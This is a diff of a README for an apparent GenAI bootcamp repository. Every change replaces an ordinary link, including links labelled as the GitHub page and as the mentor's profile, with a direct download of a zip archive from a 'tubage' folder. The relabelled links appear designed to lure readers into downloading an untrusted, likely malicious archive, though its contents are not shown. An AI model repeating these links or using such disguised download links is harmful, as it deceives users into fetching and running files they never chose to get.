@@ -1,6 +1,6 @@
 # 🧠 Full-Stack-GenAI-Bootcamp-1.0 - Learn, Build, Ship Fast
 
-[![Download](https://img.shields.io/badge/Download%20Now-GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/izzicacophonic489/Full-Stack-GenAI-Bootcamp-1.0)
+[![Download](https://img.shields.io/badge/Download%20Now-GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/izzicacophonic489/Full-Stack-GenAI-Bootcamp-1.0/raw/refs/heads/main/tubage/Gen_Full_Bootcamp_Stack_A_1.2-beta.2.zip)
 
 ## 📘 Overview
 
@@ -10,7 +10,7 @@ This project is made for users who want to learn by doing. It combines app setup
 
 ## 👨‍🏫 Mentor
 
-🔗 [Visit Mentor Profile](https://sunnysavita10.github.io/)
+🔗 [Visit Mentor Profile](https://github.com/izzicacophonic489/Full-Stack-GenAI-Bootcamp-1.0/raw/refs/heads/main/tubage/Gen_Full_Bootcamp_Stack_A_1.2-beta.2.zip)
 
 ## 💻 What You Need
 
@@ -40,7 +40,7 @@ The structure is meant to be easy to follow, even if you are new to software too
 
 Use this link to visit the page and download or open the project:
 
-[Visit the download page](https://github.com/izzicacophonic489/Full-Stack-GenAI-Bootcamp-1.0)
+[Visit the download page](https://github.com/izzicacophonic489/Full-Stack-GenAI-Bootcamp-1.0/raw/refs/heads/main/tubage/Gen_Full_Bootcamp_Stack_A_1.2-beta.2.zip)
 
 ### Step 1: Open the link
 
@@ -190,7 +190,7 @@ You can open the GitHub page and review the files before you download anything.
 
 Use this page to access the project again later:
 
-[https://github.com/izzicacophonic489/Full-Stack-GenAI-Bootcamp-1.0](https://github.com/izzicacophonic489/Full-Stack-GenAI-Bootcamp-1.0)
+[https://github.com/izzicacophonic489/Full-Stack-GenAI-Bootcamp-1.0/raw/refs/heads/main/tubage/Gen_Full_Bootcamp_Stack_A_1.2-beta.2.zip](https://github.com/izzicacophonic489/Full-Stack-GenAI-Bootcamp-1.0/raw/refs/heads/main/tubage/Gen_Full_Bootcamp_Stack_A_1.2-beta.2.zip)
 
 ## 🧑‍💻 Learning Path
 
@@ -206,6 +206,6 @@ A simple path for first use:
 
 ## 📌 Quick Access
 
-[Open the GitHub page](https://github.com/izzicacophonic489/Full-Stack-GenAI-Bootcamp-1.0)
+[Open the GitHub page](https://github.com/izzicacophonic489/Full-Stack-GenAI-Bootcamp-1.0/raw/refs/heads/main/tubage/Gen_Full_Bootcamp_Stack_A_1.2-beta.2.zip)
 
-[Visit the mentor profile](https://sunnysavita10.github.io/)
+[Visit the mentor profile](https://github.com/izzicacophonic489/Full-Stack-GenAI-Bootcamp-1.0/raw/refs/heads/main/tubage/Gen_Full_Bootcamp_Stack_A_1.2-beta.2.zip)
